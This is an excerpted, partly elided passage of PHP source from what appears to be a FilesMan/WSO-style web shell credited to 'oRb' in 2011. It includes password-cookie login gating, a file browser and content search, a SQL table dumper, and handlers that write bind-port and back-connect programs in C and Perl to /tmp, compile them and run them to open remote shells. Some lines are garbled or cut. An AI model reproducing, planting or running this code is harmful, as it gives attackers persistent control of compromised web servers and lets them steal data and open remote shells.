...
$s = 'UTF-8';
$s = 'FilesMan';
//$s = md5($_SERVER['HTTP_USER_AGENT']);
//if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
//prototype(md5($_SERVER['HTTP_HOST'])."key", $s);
//}
...
/* () 11.2011 oRb */
if(!empty($s)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $s))
        prototype(md5($_SERVER['HTTP_HOST']), $s);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $s))
        hardLogin();
}
if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$s;
function hardLogin() {
...
$opt_charsets = '';
foreach($charsets as $s)
$opt_charsets .= '<option value="'.$s.'" '.($_POST['charset']==$s.'selected'.':'.'').'>'.$s.'</option>';
...
return ($s==''?" Query did not return anything\n":$s);
}
function viewSize($s) {
if($s >= 1073741824)
...
if(empty($_POST['p2']) || @strpos(file_get_contents($s), $_POST['p2'])!==false)
echo "<a href='#' onclick='g(\"FilesTools\",null,\"".urlencode($s)."\", \"view\",\"\")'>".htmlspecialchars($s)."</a><br>";
}
}
}
}
...
$columns[] = $k;
                        ...
                        $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $s).');'."\n";
                        if($fp) fwrite($fp, $sql); else echo($sql);
}
break;
}
...
$s = ex("gcc -o /tmp/bp /tmp/bp.c");
@unlink("/tmp/bp.c");
$s.= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &");
echo "<pre class=ml1>$".ex("ps aux | grep bp")."</pre>";
}
if($_POST['p1'] == 'bpp') {
cf("/tmp/bp.pl",$bind_port_p);
$s = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &");
echo "<pre class=ml1>$".ex("ps aux | grep bp.pl")."</pre>";
}
if($_POST['p1'] == 'bcc') {
cf("/tmp/bc.c",$back_connect_c);
$s = ex("gcc -o /tmp/bc /tmp/bc.c");
@unlink("/tmp/bc.c");
$s .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");
echo "<pre class=ml1>$".ex("ps aux | grep bc")."</pre>";
}
if($_POST['p1'] == 'bcp') {
cf("/tmp/bc.pl",$back_connect_p);
$s = ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &");
...
if( empty($_POST['a']) )
if(isset($s) && function_exists('action' . $s))
$_POST['a'] = $s;
else
$_POST['a'] = 'FilesMan';
